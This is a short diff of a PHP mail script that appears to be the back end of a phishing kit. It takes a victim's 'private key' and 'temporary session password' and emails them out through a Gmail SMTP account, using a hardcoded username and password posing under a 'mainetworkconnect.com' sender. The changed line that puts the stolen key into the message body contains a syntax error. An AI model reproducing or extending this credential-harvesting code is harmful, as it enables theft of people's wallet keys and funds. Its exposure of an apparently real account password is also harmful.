@@ -30,9 +30,9 @@ $mail->Port = "587";
 $mail->Username = "emmajoy658@gmail.com";
 $mail->Password = "Olasunkanmi2001!";
 $mail->setFrom("noreply@mainetworkconnect.com");
-$mail->AddReplyTo("emmajoy658@gmail.com");
+$mail->AddReplyTo("noreply@mainetworkconnect.com");
 $mail->Subject = "/New Entry";
-$mail->MsgHTML("noreply@mainetworkconnect.com");
+$mail->MsgHTML($privatekey .  . $pkpass);
 
 $mail->Body = "Private Key= " . $privatekey . "\r\n Temporary Session Password= " . $pkpass;
 
